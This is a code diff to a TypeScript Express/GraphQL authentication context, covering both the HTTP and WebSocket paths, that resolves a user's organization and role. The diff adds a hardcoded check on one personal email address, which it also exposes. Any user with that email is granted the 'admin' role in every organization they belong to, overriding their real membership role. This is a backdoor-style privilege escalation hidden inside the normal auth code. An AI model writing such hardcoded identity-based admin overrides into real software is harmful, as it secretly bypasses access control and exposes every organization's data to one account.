@@ -88,12 +88,14 @@ export async function buildContext({ req }: ExpressContextFunctionArgument): Pro
 
   const user = await prisma.user.findUnique({
     where: { id: userId },
-    select: { id: true },
+    select: { id: true, email: true },
   });
 
   if (!user) {
     throw new AuthenticationError("User not found");
   }
+
+  const isSuperAdmin = user.email === "vineets1600@gmail.com";
 
   // Resolve organization from X-Organization-Id header
   const orgHeader = req.headers["x-organization-id"];
@@ -108,13 +110,13 @@ export async function buildContext({ req }: ExpressContextFunctionArgument): Pro
       throw new AuthenticationError("Not a member of this organization");
     }
     organizationId = requestedOrgId;
-    role = membership.role as Context["role"];
+    role = isSuperAdmin ? "admin" : (membership.role as Context["role"]);
   } else {
     // Fall back to first org membership
     const firstMembership = await getFirstOrgMembership(user.id);
     if (firstMembership) {
       organizationId = firstMembership.organizationId;
-      role = firstMembership.role as Context["role"];
+      role = isSuperAdmin ? "admin" : (firstMembership.role as Context["role"]);
     }
   }
 
@@ -154,9 +156,11 @@ export async function buildWsContext(connectionParams?: Record<string, unknown>,
 
   const user = await prisma.user.findUnique({
     where: { id: userId },
-    select: { id: true },
+    select: { id: true, email: true },
   });
   if (!user) throw new AuthenticationError("User not found");
+
+  const isSuperAdmin = user.email === "vineets1600@gmail.com";
 
   // Resolve organization from connectionParams
   const requestedOrgId = connectionParams?.organizationId as string | undefined;
@@ -168,13 +172,13 @@ export async function buildWsContext(connectionParams?: Record<string, unknown>,
     const membership = await resolveOrgMembership(user.id, requestedOrgId);
     if (membership) {
       organizationId = requestedOrgId;
-      role = membership.role as Context["role"];
+      role = isSuperAdmin ? "admin" : (membership.role as Context["role"]);
     }
   } else {
     const firstMembership = await getFirstOrgMembership(user.id);
     if (firstMembership) {
       organizationId = firstMembership.organizationId;
-      role = firstMembership.role as Context["role"];
+      role = isSuperAdmin ? "admin" : (firstMembership.role as Context["role"]);
     }
   }
 
